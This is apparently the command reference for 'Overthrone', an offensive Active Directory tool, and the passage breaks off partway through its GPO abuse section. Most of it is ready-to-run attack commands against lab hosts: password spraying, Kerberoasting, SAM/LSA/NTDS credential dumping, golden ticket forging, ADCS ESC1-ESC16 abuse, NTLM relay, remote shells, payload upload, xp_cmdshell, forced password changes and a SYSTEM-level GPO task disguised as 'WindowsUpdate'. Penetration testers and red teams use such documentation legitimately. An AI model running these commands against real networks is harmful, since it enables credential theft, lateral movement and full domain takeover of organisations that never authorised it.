# Command List

Every command works as both `overthrone <cmd>` and `ovt <cmd>`. We use `ovt` because life is short and keystrokes are precious.

<p align="center">
  <b>Guided Interactive Wizard</b><br/>
  <a href="#ovt-wizard---interactive-guided-mode">wizard</a>
</p>

<p align="center">
  <b>Enumeration</b><br/>
  <a href="#ovt-enum---quick-enumeration-by-target-type">enum</a> &nbsp;·&nbsp;
  <a href="#ovt-reaper---full-ad-enumeration-engine">reaper</a> &nbsp;·&nbsp;
  <a href="#ovt-rid---rid-cycling">rid</a> &nbsp;·&nbsp;
  <a href="#ovt-scan---port-scanner--discovery">scan</a> &nbsp;·&nbsp;
  <a href="#ovt-snaffler---sensitive-file-discovery">snaffler</a> &nbsp;·&nbsp;
  <a href="#ovt-powerview---advanced-ad-enumeration">powerview</a> &nbsp;·&nbsp;
  <a href="#ovt-guid---ad-aceguid-resolver">guid</a> &nbsp;·&nbsp;
  <a href="#ovt-laps---laps-password-reading">laps</a> &nbsp;·&nbsp;
  <a href="#ovt-gpp---gpp-password-decryption">gpp</a>
</p>

<p align="center">
  <b>Kerberos &amp; Credentials</b><br/>
  <a href="#ovt-kerberos---kerberos-operations">kerberos</a> &nbsp;·&nbsp;
  <a href="#ovt-spray---password-spraying">spray</a> &nbsp;·&nbsp;
  <a href="#ovt-crack---hash-cracking">crack</a> &nbsp;·&nbsp;
  <a href="#ovt-dump---credential-dumping">dump</a> &nbsp;·&nbsp;
  <a href="#ovt-secrets---offline-secrets-dumping">secrets</a>
</p>

<p align="center">
  <b>Lateral Movement &amp; Execution</b><br/>
  <a href="#ovt-exec---remote-command-execution">exec</a> &nbsp;·&nbsp;
  <a href="#ovt-shell---interactive-remote-shell">shell</a> &nbsp;·&nbsp;
  <a href="#ovt-smb---smb-operations">smb</a> &nbsp;·&nbsp;
  <a href="#ovt-move---lateral-movement--trust-mapping">move</a> &nbsp;·&nbsp;
  <a href="#ovt-mssql---mssql-operations">mssql</a>
</p>

<p align="center">
  <b>Persistence &amp; Certificates</b><br/>
  <a href="#ovt-forge---ticket-forging--persistence">forge</a> &nbsp;·&nbsp;
  <a href="#ovt-adcs---adcs-certificate-abuse-esc1-esc16">adcs</a> &nbsp;·&nbsp;
  <a href="#ovt-ntlm---ntlm-relay--poisoning">ntlm</a> &nbsp;·&nbsp;
  <a href="#ovt-graph---attack-graph-engine">graph</a>
</p>

<p align="center">
  <b>ACL &amp; GPO Abuse</b><br/>
  <a href="#ovt-acl---acldacl-abuse">acl</a> &nbsp;·&nbsp;
  <a href="#ovt-gpo---group-policy-abuse">gpo</a>
</p>

<p align="center">
  <b>Azure &amp; Cloud</b><br/>
  <a href="#ovt-azure---azure-ad--entra-id-attacks">azure</a>
</p>

<p align="center">
  <b>Infrastructure &amp; Misc</b><br/>
  <a href="#ovt-c2---c2-framework-integration">c2</a> &nbsp;·&nbsp;
  <a href="#ovt-sccm---sccmmecm-abuse">sccm</a> &nbsp;·&nbsp;
  <a href="#ovt-plugin---plugin-system">plugin</a> &nbsp;·&nbsp;
  <a href="#ovt-module---built-in-module-management">module</a> &nbsp;·&nbsp;
  <a href="#ovt-report---engagement-reporting">report</a> &nbsp;·&nbsp;
  <a href="#ovt-doctor---environment-diagnostics">doctor</a> &nbsp;·&nbsp;
  <a href="#ovt-tui---interactive-terminal-ui">tui</a> &nbsp;·&nbsp;
  <a href="#ovt-completions---shell-tab-completion">completions</a>
</p>

---

## Global Flags

These work on every single command:

| Flag | Short | Env Var | What it does |
|---|---|---|---|
| `--dc-host` | `-H` | `OT_DC_HOST` | Domain Controller IP or hostname (aliases: `--dc`, `--dc-ip`) |
| `--domain` | `-d` | `OT_DOMAIN` | Target domain (e.g., `corp.local`) |
| `--username` | `-u` | `OT_USERNAME` | Domain username |
| `--password` | `-p` | `OT_PASSWORD` | Password |
| `--nt-hash` | | `OT_NT_HASH` | NTLM hash for Pass-the-Hash (`LM:NT` or `NT` format) |
| `--ticket` | | `KRB5CCNAME` | Kerberos ticket cache file |
| `--auth-method` | `-A` | | Auth method: `password` (default), `nt_hash`, `ticket` |
| `--user-list` | `-U` | | File with usernames (one per line) |
| `--pass-list` | `-P` | | File with passwords (one per line) |
| `--user-pass-list` | | | File with `user:pass` or `user:ntlm_hash` pairs |
| `--ldaps` | | | Use LDAP over SSL (port 636) |
| `--verbose` | `-v` | | Verbosity: `-v` info, `-vv` debug, `-vvv` trace |
| `--output-format` | | | Output format: `text`, `json`, `csv`. Default: `text` |
| `--outfile` | `-O` | | Save output to file |

---

## `ovt wizard` - Interactive Guided Mode

The successor to auto-pwn. Same kill chain, but with guardrails — pauses after each stage for operator review, supports session resume, and a Q-learning brain that gets smarter the more you use it.

```bash
# Start a new wizard session
ovt wizard --target "Domain Admins" --dc-host 10.10.10.1 -d corp.local -u student -p 'Lab123!'

# Resume from checkpoint
ovt wizard --resume ./checkpoints/wiz_session.json

# Skip enumeration - load state from previous run
ovt wizard --target DA --skip-enum --from-file enum.json

# Fully automated - no pauses
ovt wizard --target DA --dc-host 10.10.10.1 -d corp.local -u jsmith -p 'Pass!' --no-pause
```

| Flag | Default | What it does |
|---|---|---|
| `--target`, `-t` | required | Goal: `"Domain Admins"`, `"ntds"`, hostname, username |
| `--resume` | none | Resume from checkpoint JSON |
| `--checkpoint-dir` | `./checkpoints` | Directory for checkpoint files |
| `--skip-enum` | `false` | Skip enumeration (requires `--from-file`) |
| `--from-file` | none | Load previous enumeration state JSON |
| `--no-pause` | `false` | Don't pause between stages |
| `--no-auto-crack` | `false` | Don't prompt for hash cracking |
| `--pause-timeout` | `300` | Seconds before auto-continuing (0 = wait forever) |
| `--max-stage` | `loot` | Maximum stage to reach |
| `--exec-method`, `-m` | `auto` | Preferred execution method |
| `--stealth` | `false` | Low-noise mode |
| `--dry-run` | `false` | Plan only |
| `--jitter-ms` | `1000` | Jitter between operations |
| `--ldaps` | `false` | Use LDAPS |
| `--timeout` | `30` | Per-step timeout (seconds) |

---

## `ovt reaper` - Full AD Enumeration Engine

The "tell me everything" command. Runs all enumeration modules against the DC via LDAP.

```bash
# Run all modules
ovt reaper --dc-ip 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Run specific modules only
ovt reaper --dc-ip 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' \
  --modules users,computers,groups,acls

# Big domain? Increase page size
ovt reaper --dc-ip 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --page-size 1000
```

| Flag | Default | What it does |
|---|---|---|
| `--dc-ip` | | Domain Controller IP (also `--dc`, `--dc-host`) |
| `--modules`, `-m` | all | Comma-separated: `users`, `computers`, `groups`, `acls`, `trusts`, `gpos` |
| `--page-size` | `500` | LDAP page size |

Aliases: `ovt harvest`

---

## `ovt scan` - Port Scanner & Discovery

Port scanner with optional LDAP/SMB null-session probes.

```bash
# Scan top 1000 ports on target
ovt scan --targets 10.10.10.1

# Custom port range with LDAP + SMB null-session checks
ovt scan --targets 10.10.10.1 -P 80,443,445,3389,5985 --ldap --smb

# Port scan only, skip null-session probes
ovt scan --targets 10.10.10.0/24 --no-ldap --no-smb

# SYN scan (requires root/raw sockets)
ovt scan --targets 10.10.10.0/24 --scan-type syn

# ACK scan (firewall rule mapping)
ovt scan --targets 10.10.10.0/24 --scan-type ack
```

| Flag | Default | What it does |
|---|---|---|
| `--targets`, `-t` | required | Target hosts (IP, CIDR, or range) |
| `--ports`, `-P` | `top1000` | Port range: `80,443`, `1-65535`, or `top1000` |
| `--scan-type`, `-T` | `connect` | `syn` (needs root), `connect`, `ack` |
| `--timeout` | `1000` | Timeout in milliseconds |
| `--ldap` | `true` | Enable anonymous LDAP RootDSE probe |
| `--smb` | `true` | Enable SMB null-session share checks |
| `--no-ldap` | `false` | Skip LDAP checks |
| `--no-smb` | `false` | Skip SMB checks |

Aliases: `ovt portscan`, `ovt discovery`

---

## `ovt snaffler` - Sensitive File Discovery

Recursively scans accessible SMB shares for high-value files.

```bash
# Snaffle all computers found in AD
ovt snaffler -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Save findings to JSON
ovt snaffler -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' \
  --output-format json -O findings.json
```

| Flag | Default | What it does |
|---|---|---|
| `--page-size` | `500` | LDAP page size for computer enumeration |

---

## `ovt powerview` - Advanced AD Enumeration

PowerView-style granular AD enumeration. Aliases: `pv`, `power-view`.

```bash
# Get detailed GPO info
ovt powerview gpos --name "Default Domain Policy" -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Get all properties for a specific user
ovt powerview users --identity "adm-smith" -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Find abusable ACEs for a trustee SID
ovt powerview acls --sid S-1-5-21-...-1105 -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
```

| Subcommand | What it does |
|---|---|
| `users [--identity] [--filter] [--include-disabled]` | Enumerate users |
| `computers [--filter] [--include-disabled]` | Enumerate computers |
| `groups [--group] [--filter]` | Enumerate groups |
| `trusts` | Enumerate domain trusts |
| `spns` | Enumerate Kerberoastable SPNs |
| `asrep` | Enumerate AS-REP roastable accounts |
| `delegations` | Enumerate delegation configurations |
| `gpos [--name]` | Enumerate GPOs |
| `policy` | Enumerate password/domain policy |
| `laps [--computer]` | Read LAPS passwords |
| `acls [--sid]` | Enumerate abusable ACLs for a SID |
| `all` | Enumerate everything |

---

## `ovt guid` - AD ACE/GUID Resolver

Resolve common AD control-access and attribute GUIDs.

```bash
# Resolve by right name
ovt guid resolve ForceChangePassword

# Resolve by raw GUID
ovt guid resolve 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2

# List built-in mappings, optionally filtered
ovt guid list --filter replication
```

| Subcommand | What it does |
|---|---|
| `resolve <VALUE>` | Resolve a GUID, right name, or attribute name |
| `list [--filter]` | List built-in GUID mappings |

---

## `ovt enum` - Quick Enumeration by Target Type

Enumerate specific AD object types without running the full reaper engine.

```bash
# Pre-auth and no-credential checks
ovt enum pre -H 10.10.10.1
ovt enum anonymous -H 10.10.10.1
ovt enum null-session -H 10.10.10.1

# Credentialed LDAP modules
ovt enum users -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum computers -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum groups -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum spns -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum delegations -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum all -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# With filters
ovt enum users -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --filter "admin"
ovt enum users -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --include-disabled
```

| Flag | Default | What it does |
|---|---|---|
| `--filter` | | LDAP filter string to narrow results |
| `--include-disabled` | `false` | Include disabled accounts |

| Target | What it finds |
|---|---|
| `pre` | No-credential AD service triage (Kerberos, LDAP, SMB, RPC, GC, RDP, WinRM, ADWS ports) |
| `anonymous` | Anonymous LDAP bind + RootDSE attributes |
| `null-session` | Null-session RID cycling (default RID range 500-1100) |
| `users` | All domain users |
| `computers` | All machine accounts |
| `groups` | Groups and memberships |
| `trusts` | Domain trusts |
| `spns` | Kerberoastable service accounts |
| `asrep` | AS-REP roastable accounts |
| `delegations` | Constrained, unconstrained, RBCD |
| `gpos` | Group Policy Objects |
| `laps` | LAPS-readable secrets |
| `policy` | Password and domain policy |
| `all` | Everything above |

---

## `ovt kerberos` - Kerberos Operations

Aliases: `ovt krb`, `ovt roast`

```bash
# Kerberoast - extract TGS hashes for offline cracking
ovt kerberos roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt kerberos roast --spn MSSQLSvc/db01.corp.local

# AS-REP Roast - free hashes from no-preauth accounts
ovt kerberos asrep-roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt kerberos asrep-roast --userlist users.txt

# Zero-knowledge username enumeration via Kerberos errors
ovt kerberos user-enum -H 10.10.10.1 -d corp.local --output ./loot/valid_users.txt
ovt kerberos user-enum -H 10.10.10.1 -d corp.local --use-ldap
ovt kerberos user-enum -H 10.10.10.1 -d corp.local \
  --userlist /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  --concurrency 20 --delay 100

# Request a TGT
ovt kerberos get-tgt -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Request a TGS for a specific SPN
ovt kerberos get-tgs --spn cifs/dc01.corp.local -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
```

| Subcommand | Flags | What it does |
|---|---|---|
| `roast` | `--spn` (optional) | Kerberoast SPN accounts |
| `asrep-roast` | `--userlist`/`-U` (optional) | AS-REP roast no-preauth accounts |
| `user-enum` | `--userlist`, `--output`, `--delay`, `--concurrency`, `--use-ldap` | Zero-knowledge username enumeration |
| `get-tgt` | | Request a TGT |
| `get-tgs` | `--spn` (required) | Request a TGS for a specific SPN |

---

## `ovt smb` - SMB Operations

```bash
# List shares on a target
ovt smb shares --target 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Check admin access on multiple targets
ovt smb admin --targets 10.10.10.1,10.10.10.2 -d corp.local -u admin -p 'Admin!'

# Spider shares for juicy files
ovt smb spider --target 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt smb spider --target 10.10.10.1 --extensions ".config,.xml,.txt,.sql"

# Download a file from a share
ovt smb get --target 10.10.10.1 --path "SYSVOL/corp.local/Policies/passwords.xml" \
  -d corp.local -u jsmith -p 'Summer2026!'

# Upload a file to a share
ovt smb put --target 10.10.10.1 --local payload.exe --remote "C$/Windows/Temp/payload.exe" \
  -d corp.local -u jsmith -p 'Summer2026!'
```

| Subcommand | Flags | What it does |
|---|---|---|
| `shares` | `--target`/`-t` (required) | List SMB shares |
| `admin` | `--targets`/`-t` (required) | Check admin access (comma-separated) |
| `spider` | `--target`/`-t` (required), `--extensions` (default: `.kdbx,.key,.pem,.config,.ps1,.rdp`) | Spider for sensitive files |
| `get` | `--target`/`-t` (required), `--path`/`-P` (required) | Download file from share |
| `put` | `--target`/`-t` (required), `--local`/`-l` (required), `--remote`/`-r` (required) | Upload file to share |

---

## `ovt exec` - Remote Command Execution

```bash
# Auto-detect best method
ovt exec --target 10.10.10.50 --command "whoami /all" -d corp.local -u admin -p 'Pass!'

# Force a specific method
ovt exec --target 10.10.10.50 --command "ipconfig /all" --method psexec
ovt exec --target 10.10.10.50 --command "hostname" --method wmiexec
ovt exec --target 10.10.10.50 --command "net user" --method winrm
ovt exec --target 10.10.10.50 --command "dir C:\" --method smbexec
```

| Flag | Default | What it does |
|---|---|---|
| `--method`, `-m` | `auto` | `auto`, `psexec`, `smbexec`, `wmiexec`, `winrm` |
| `--target`, `-t` | required | Target host |
| `--command`, `-c` | required | Command to execute |

| Method | Protocol | Notes |
|---|---|---|
| `auto` | Best available | Tries WinRM -> WMI -> SMB -> PsExec |
| `psexec` | DCE/RPC + SMB | Creates a service. Loud but reliable |
| `smbexec` | SCM over SMB | Service-based, slightly sneakier |
| `wmiexec` | DCOM/WMI | WMI semi-interactive, Windows-only |
| `winrm` | WS-Management | Native Windows remote management |

---

## `ovt shell` - Interactive Remote Shell

Persistent remote session on a target.

```bash
# WinRM shell (default)
ovt shell --target 10.10.10.50 -d corp.local -u admin -p 'Pass!'

# SMB-based shell
ovt shell --target 10.10.10.50 --shell-type smb

# WMI-based shell
ovt shell --target 10.10.10.50 --shell-type wmi
```

| Flag | Default | What it does |
|---|---|---|
| `--target`, `-t` | required | Target host |
| `--shell-type`, `-T` | `winrm` | `winrm`, `smb`, `wmi` |

---

## `ovt graph` - Attack Graph Engine

Build, query, and export the attack relationship graph. BloodHound vibes, zero Neo4j.

```bash
# Build the graph from enumeration data
ovt graph build -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Launch interactive TUI graph viewer
ovt graph view --file attack_graph.json
ovt graph view -i ./bloodhound-json/

# Launch interactive BloodHound-style hierarchy/tree explorer
ovt graph tree --file attack_graph.json
ovt graph tree -i ./bloodhound-json/

# Launch browser-based graph GUI (local web server)
ovt graph gui --file attack_graph.json
ovt graph gui -i ./graphs/
ovt graph gui -i ./graphs/ --port 8080

# Find shortest path between two nodes
ovt graph path --from jsmith --to "Domain Admins"

# Find ALL paths to Domain Admins from a user
ovt graph path-to-da --from jsmith

# Graph stats
ovt graph stats

# Export (JSON or BloodHound format)
ovt graph export --output graph.json
ovt graph export --output bloodhound.json --bloodhound
```

| Subcommand | Flags | What it does |
|---|---|---|
| `build` | `--file` (default: `attack_graph.json`) | Build graph from LDAP |
| `view` | `--input`/`-i` (default: `attack_graph.json`) | TUI graph viewer (aliases: `visual`, `ui`, `viz`) |
| `tree` | `--input`/`-i` (default: `attack_graph.json`) | Tree explorer (aliases: `hierarchy`, `explore`) |
| `gui` | `--input`/`-i`, `--port` (default: `0` = free port) | Browser-based GUI (aliases: `web`, `browser`) |
| `path` | `--from` (required), `--to`/`-t` (required) | Shortest path between two nodes |
| `path-to-da` | `--from` (required) | All paths to Domain Admins |
| `stats` | `--file` | Graph statistics |
| `export` | `--output`/`-o`, `--bloodhound`/`-B` | Export graph to JSON |

---

## `ovt spray` - Password Spraying

The "try one password against everyone" attack.

```bash
ovt spray -H 10.10.10.1 -d corp.local \
  --password 'Winter2026!' --userlist users.txt --delay 1 --jitter 0

# With LDAP-backed user enumeration
ovt spray -H 10.10.10.1 -d corp.local \
  --password 'Winter2026!' --use-ldap --concurrency 10
```

| Flag | Default | What it does |
|---|---|---|
| `--password`, `-p` | required | The password to spray |
| `--userlist`, `-U` | | File with usernames (also `--users`) |
| `--use-ldap` | `false` | Attempt LDAP-based username enumeration |
| `--delay` | `1` | Seconds between attempts |
| `--jitter` | `0` | Random extra delay |
| `--concurrency` | `10` | Concurrent authentication attempts |

---

## `ovt dump` - Credential Dumping

```bash
# Dump SAM (local account hashes)
ovt dump --target 10.10.10.50 sam -d corp.local -u admin -p 'Pass!'

# Dump LSA secrets
ovt dump --target 10.10.10.50 lsa -d corp.local -u admin -p 'Pass!'

# Dump NTDS.dit (ALL domain hashes)
ovt dump --target 10.10.10.1 ntds -d corp.local -u da_admin -p 'DA_Pass!'

# Dump DCC2 cached credentials
ovt dump --target 10.10.10.50 dcc2 -d corp.local -u admin -p 'Pass!'
```

| Flag | Default | What it does |
|---|---|---|
| `--target`, `-t` | required | Target host |
| `source` | (positional, required) | `sam`, `lsa`, `ntds`, `dcc2` |

---

## `ovt crack` - Hash Cracking

Offline hash cracking with embedded wordlist, rules, and rayon parallelism.

```bash
# Crack a single hash
ovt crack --hash '$krb5tgs$23$*svc_sql...'

# Crack from a file
ovt crack --file kerberoast_hashes.txt

# Thorough mode with custom wordlist
ovt crack --file hashes.txt --mode thorough --wordlist /usr/share/wordlists/rockyou.txt

# Limit candidates (fast mode)
ovt crack --file hashes.txt --mode fast --max-candidates 100000
```

| Flag | Default | What it does |
|---|---|---|
| `--hash`, `-s` | | Single hash string |
| `--file`, `-f` | | File with hashes (one per line) |
| `--mode`, `-M` | `default` | `fast`, `default`, `thorough` |
| `--wordlist`, `-W` | embedded 10K | Custom wordlist |
| `--max-candidates` | `0` (unlimited) | Max candidates to try |

---

## `ovt forge` - Ticket Forging & Persistence

Forge tickets and persist access.

```bash
# Golden Ticket - be anyone, access anything
ovt forge golden --domain-sid S-1-5-21-1234... --krbtgt-hash <32hex> \
  --user Administrator --output golden.kirbi

# Silver Ticket - access one service, no DC interaction
ovt forge silver --domain-sid S-1-5-21-1234... --service-hash <32hex> \
  --spn cifs/dc01.corp.local --output silver.kirbi
```

| Subcommand | Required Flags | What it forges |
|---|---|---|
| `golden` | `--domain-sid`, `--krbtgt-hash`, `--user` (default: Administrator), `--rid` (default: 500), `--output` (default: golden.kirbi) | TGT signed with KRBTGT hash |
| `silver` | `--domain-sid`, `--service-hash`, `--spn`, `--user` (default: Administrator), `--rid` (default: 500), `--output` (default: silver.kirbi) | TGS for a specific service |

---

## `ovt adcs` - ADCS Certificate Abuse (ESC1-ESC16)

Alias: `ovt certify`

```bash
# Enumerate vulnerable templates
ovt adcs enum -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt adcs enum --ca CA01.corp.local

# ESC1 - SAN abuse (most common)
ovt adcs esc1 --ca CA01 --template VulnTemplate --target-user Administrator

# ESC2 - Any purpose EKU
ovt adcs esc2 --ca CA01 --template AnyPurpose

# ESC3 - Enrollment agent abuse
ovt adcs esc3 --ca CA01 --agent-template Agent --target-template User --target-user admin

# ESC4 - Writable template ACLs
ovt adcs esc4 --ca CA01 --template WritableTemplate

# ESC5 - Vulnerable CA config
ovt adcs esc5 --ca CA01

# ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
ovt adcs esc6 --ca CA01 --target-user Administrator

# ESC7 - ManageCA permission abuse
ovt adcs esc7 --ca CA01

# ESC8 - NTLM relay to web enrollment
ovt adcs esc8 --url https://ca01.corp.local/certsrv --target-user Administrator

# ESC9 - No Security Extension + UPN poisoning
ovt adcs esc9 --ca CA01 --template NoSecExt --target-upn admin@corp.local \
  --victim jsmith --original-upn jsmith@corp.local \
  --target-dc 10.10.10.1 --ldap-user admin --ldap-pass 'Pass!'

# ESC10 - Weak certificate mapping
ovt adcs esc10 --ca CA01 --template User --target-upn admin@corp.local --variant a

# ESC11 - NTLM relay to ICPR
ovt adcs esc11 --ca-host ca01.corp.local --ca-name CORP-CA01 --template User

# ESC12 - CA private key extraction guidance
ovt adcs esc12 --ca-host ca01.corp.local --ca-name CORP-CA01

# ESC13 - Issuance policy OID linked to privileged group
ovt adcs esc13 --ca CA01 --template PolicyTemplate --policy-oid 1.2.3.4 \
  --linked-group-dn "CN=Domain Admins,CN=Users,DC=corp,DC=local"

# ESC14 - Strong certificate mapping bypass
ovt adcs esc14 --target-dn "CN=admin,CN=Users,DC=corp,DC=local" \
  --target-sam admin --mapping "corp.local\admin" --live

# ESC15 - CA Exchange metadata poisoning
ovt adcs esc15 --ca CA01 --template VulnTemplate --target-user Administrator

# ESC16 - Partial CA certificate chain compromise
ovt adcs esc16 --ca CA01 --template User --target-upn admin@corp.local \
  --victim jsmith --original-upn jsmith@corp.local

# Request a certificate manually
ovt adcs request --ca CA01 --template User --san "administrator@corp.local" -o cert.pfx
```

---

## `ovt ntlm` - NTLM Relay & Poisoning

Alias: `ovt relay`

```bash
# Capture NTLM hashes (Responder-style)
ovt ntlm capture --interface eth0
ovt ntlm capture --interface eth0 --no-poison

# Relay to SMB targets
ovt ntlm relay --targets 10.10.10.50:445,10.10.10.51:445
ovt ntlm relay --targets 10.10.10.50:445 --no-poison

# SMB-specific relay with signing bypass
ovt ntlm smb-relay --targets 10.10.10.50:445 --command "whoami"

# HTTP relay (for ADCS ESC8)
ovt ntlm http-relay --targets 10.10.10.1:80 --command "whoami"
```

| Subcommand | Flags | What it does |
|---|---|---|
| `capture` | `--interface`/`-i` (default: `0.0.0.0`), `--port`/`-P` (default: `445`), `--no-poison` | Capture NTLM hashes |
| `relay` | `--targets`/`-t` (required, comma-separated), `--port`/`-P` (default: `445`), `--command`/`-c`, `--no-poison` | Relay to targets |
| `smb-relay` | `--targets`/`-t` (required), `--port`/`-P` (default: `445`), `--command`/`-c` | SMB relay with signing bypass |
| `http-relay` | `--targets`/`-t` (required), `--port`/`-P` (default: `80`), `--command`/`-c` | HTTP/HTTPS relay |

---

## `ovt secrets` - Offline Secrets Dumping

Parse registry hive files offline (SAM, SECURITY, SYSTEM).

```bash
# Dump SAM hashes from hive files
ovt secrets sam --sam ./SAM --system ./SYSTEM

# Dump LSA secrets
ovt secrets lsa --security ./SECURITY --system ./SYSTEM

# Dump cached domain credentials (DCC2)
ovt secrets dcc2 --security ./SECURITY --system ./SYSTEM
```

| Subcommand | Required Flags | What it does |
|---|---|---|
| `sam` | `--sam`, `--system` | Dump SAM hashes |
| `lsa` | `--security`, `--system` | Dump LSA secrets |
| `dcc2` | `--security`, `--system` | Dump cached domain credentials |

---

## `ovt gpp` - GPP Password Decryption

Decrypt Group Policy Preferences cpassword values.

```bash
# Decrypt from a GPP XML file
ovt gpp --file Groups.xml

# Decrypt a raw cpassword string
ovt gpp --cpassword "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+..."
```

---

## `ovt laps` - LAPS Password Reading

Read local admin passwords stored in AD (LAPS v1 + v2).

```bash
# Read all LAPS passwords
ovt laps -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Read for a specific computer
ovt laps --computer WS01 -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
```

| Flag | Default | What it does |
|---|---|---|
| `--computer` | none | Only query a specific computer |

---

## `ovt rid` - RID Cycling

Aliases: `ovt rid-cycle`, `ovt rid-brute`

Enumerate users/groups via MS-SAMR.

```bash
# Default range (RID 500-10500)
ovt rid -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Custom range
ovt rid -H 10.10.10.1 -d corp.local --start-rid 500 --end-rid 50000

# Null session (no creds needed, if DC allows it)
ovt rid -H 10.10.10.1 -d corp.local --null-session
```

| Flag | Default | What it does |
|---|---|---|
| `--start-rid` | `500` | Starting RID |
| `--end-rid` | `10500` | Ending RID |
| `--null-session` | `false` | Use null session (no credentials) |

---

## `ovt move` - Lateral Movement & Trust Mapping

Aliases: `ovt lateral`

```bash
# Display domain trust relationships
ovt move trusts -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Find cross-domain escalation paths
ovt move escalation -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Analyze MSSQL linked server chains
ovt move mssql -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Print full trust map visualization
ovt move map -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
```

| Subcommand | What it does |
|---|---|
| `trusts` | Display domain trust relationships |
| `escalation` | Find cross-domain escalation paths |
| `mssql` | Analyze MSSQL linked server chains |
| `map` | Print full trust map visualization |

---

## `ovt mssql` - MSSQL Operations

Aliases: `ovt sql`

```bash
# Execute a SQL query
ovt mssql query --target 10.10.10.100 --query "SELECT @@version" -d corp.local -u sa -p 'sa'

# Execute OS command via xp_cmdshell
ovt mssql xp-cmdshell --target 10.10.10.100 --command "whoami"

# Enumerate linked servers
ovt mssql linked-servers --target 10.10.10.100

# Enable xp_cmdshell
ovt mssql enable-xp-cmdshell --target 10.10.10.100

# Check if xp_cmdshell is enabled
ovt mssql check-xp-cmdshell --target 10.10.10.100
```

| Subcommand | Flags | What it does |
|---|---|---|
| `query` | `--target`/`-t` (required), `--query`/`-q` (required), `--database`/`-D` (default: `master`) | Execute SQL query |
| `xp-cmdshell` | `--target`/`-t` (required), `--command`/`-c` (required) | OS command via xp_cmdshell |
| `linked-servers` | `--target`/`-t` (required) | Enumerate linked servers |
| `enable-xp-cmdshell` | `--target`/`-t` (required) | Enable xp_cmdshell |
| `check-xp-cmdshell` | `--target`/`-t` (required) | Check xp_cmdshell status |

---

## `ovt acl` - ACL/DACL Abuse

Aliases: `ovt dacl`

ACL-based privilege escalation: force-change passwords, add group members, write DACLs.

```bash
# Force-change a user's password
ovt acl force-password --target jdoe --password 'NewPass123!' \
  -H 10.10.10.1 -d corp.local -u admin -p 'Pass!'

# Add a member to a group
ovt acl add-member --group "CN=Domain Admins,CN=Users,DC=corp,DC=local" \
  --member "CN=jsmith,CN=Users,DC=corp,DC=local"

# Remove a member from a group
ovt acl remove-member --group "CN=Domain Admins,CN=Users,DC=corp,DC=local" \
  --member "CN=jsmith,CN=Users,DC=corp,DC=local"

# Grant GenericAll to a trustee on a target object
ovt acl write-dacl --target "CN=DC01,OU=Domain Controllers,DC=corp,DC=local" \
  --trustee jsmith

# Write an SPN on a target user (for Kerberoasting)
ovt acl write-spn --target "CN=svc_backup,CN=Users,DC=corp,DC=local" \
  --spn "MSSQLSvc/db01.corp.local"

# Remove an SPN from a target user
ovt acl remove-spn --target "CN=svc_backup,CN=Users,DC=corp,DC=local" \
  --spn "MSSQLSvc/db01.corp.local"

# Enumerate abusable ACLs for a SID
ovt acl enum --sid S-1-5-21-...-1105
```

| Subcommand | Flags | What it does |
|---|---|---|
| `force-password` | `--target`/`-t` (required), `--password`/`-p` (required) | Force-change a user's password |
| `add-member` | `--group`/`-g` (required), `--member`/`-m` (required) | Add member to group |
| `remove-member` | `--group`/`-g` (required), `--member`/`-m` (required) | Remove member from group |
| `write-dacl` | `--target`/`-t` (required), `--trustee` (required) | Grant GenericAll to trustee on target |
| `write-spn` | `--target`/`-t` (required), `--spn`/`-s` (required) | Write SPN on target user |
| `remove-spn` | `--target`/`-t` (required), `--spn`/`-s` (required) | Remove SPN from target user |
| `enum` | `--sid` (optional) | Enumerate abusable ACLs |

---

## `ovt gpo` - Group Policy Abuse

Write ImmediateTask XML to SYSVOL for code execution via Computer/User GPO.

```bash
# Enumerate all GPOs and their links
ovt gpo enum -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Write an ImmediateTask to a GPO (executes as SYSTEM)
ovt gpo write --gpo "Default Domain Policy" \
  --sysvol "\\dc01.corp.local\SYSVOL\corp.local\Policies" \
  --command "powershell -enc <base64>" -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Custom task name
ovt gpo write --gpo "Default Domain Policy" \
  --sysvol "\\dc01.corp.local\SYSVOL\corp.local\Policies" \
  --command "whoami" --task-name "WindowsUpdate"

# Apply to User policy directory instead of Machine
ovt gpo write --gpo "Default Domain Policy" \
